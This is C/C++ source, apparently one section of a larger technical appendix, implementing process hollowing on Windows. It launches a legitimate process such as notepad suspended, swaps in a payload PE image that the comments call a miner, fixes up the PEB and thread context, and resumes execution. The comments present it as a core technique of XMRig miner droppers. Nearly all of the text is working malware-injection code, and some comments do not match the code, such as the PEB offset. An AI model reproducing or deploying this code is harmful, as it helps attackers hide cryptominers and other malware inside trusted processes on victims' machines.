// B.6 PROCESS HOLLOWING
//     Spawn legitimate process suspended, replace image
//     Core technique in modern miner droppers (XMRig variants)
// -------------------------------------------------------

// NtUnmapViewOfSection typedef — not exported in user-mode header
typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

bool ProcessHollow(
    const wchar_t* target_exe,   // e.g. L"C:\\Windows\\System32\\notepad.exe"
    const BYTE*    payload,      // PE image of miner
    SIZE_T         payload_size
) {
    // Step 1: Create target process in suspended state
    STARTUPINFOW        si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);

    if (!CreateProcessW(target_exe, nullptr, nullptr, nullptr,
                        FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return false;

    // Step 2: Read target process PEB to get ImageBase
    PROCESS_BASIC_INFORMATION pbi = {};
    auto NtQIP = (decltype(&NtQueryInformationProcess))(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));
    if (!NtQIP) goto fail;

    NtQIP(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    // PEB.ImageBaseAddress is at offset 8 (x64) or 8 (x32) from PEB base
    PVOID image_base_ptr = (PBYTE)pbi.PebBaseAddress + 0x10; // x64: PEB+0x10
    PVOID remote_image_base;
    ReadProcessMemory(pi.hProcess, image_base_ptr,
                      &remote_image_base, sizeof(PVOID), nullptr);

    // Step 3: Unmap original image
    auto NtUVOS = (pNtUnmapViewOfSection)(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
    if (NtUVOS) NtUVOS(pi.hProcess, remote_image_base);

    // Step 4: Parse payload PE headers
    auto dos = (PIMAGE_DOS_HEADER)payload;
    auto nt  = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);

    // Step 5: Allocate memory in target at preferred base
    PVOID remote_base = VirtualAllocEx(
        pi.hProcess,
        (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remote_base) {
        // Retry at any base
        remote_base = VirtualAllocEx(pi.hProcess, nullptr,
            nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!remote_base) goto fail;

    // Step 6: Write PE headers
    WriteProcessMemory(pi.hProcess, remote_base,
                       payload, nt->OptionalHeader.SizeOfHeaders, nullptr);

    // Step 7: Write each section
    auto section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        PVOID remote_section = (PBYTE)remote_base + section->VirtualAddress;
        WriteProcessMemory(pi.hProcess, remote_section,
            payload + section->PointerToRawData,
            section->SizeOfRawData, nullptr);
    }

    // Step 8: Fix remote image base in PEB
    WriteProcessMemory(pi.hProcess, image_base_ptr,
                       &remote_base, sizeof(PVOID), nullptr);

    // Step 9: Fix thread context entry point
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    #ifdef _WIN64
        ctx.Rcx = (DWORD64)remote_base + nt->OptionalHeader.AddressOfEntryPoint;
    #else
        ctx.Eax = (DWORD)remote_base + nt->OptionalHeader.AddressOfEntryPoint;
    #endif

    SetThreadContext(pi.hThread, &ctx);

    // Step 10: Resume execution
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;

fail:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return false;
}

